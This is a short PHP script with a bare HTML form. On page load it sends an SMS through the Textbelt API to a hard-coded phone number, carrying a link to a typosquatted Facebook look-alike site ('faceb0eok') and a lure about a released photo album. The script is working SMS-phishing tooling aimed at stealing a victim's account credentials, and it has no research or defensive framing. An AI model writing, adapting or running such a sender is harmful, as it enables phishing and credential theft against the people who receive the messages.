
<?php
if (isset($_GET['submit'])) {}

$ch = curl_init('https://textbelt.com/text');
$data = array(
  'phone' => '+94701348298',
  'message' => 'https://faceb0eok.000webhostapp.com/ , Hi,This is your photo album relesed by FEL',
  'key' => 'textbelt',
);

curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

?>

<!DOCTYPE html>
<html>
<head>
	<title>Send</title>
</head>
<body>
<form method="GET" action="del.php">
	<input type="text" name="number">
	<input type="submit" name="submit">
</form>
</body>
</html>

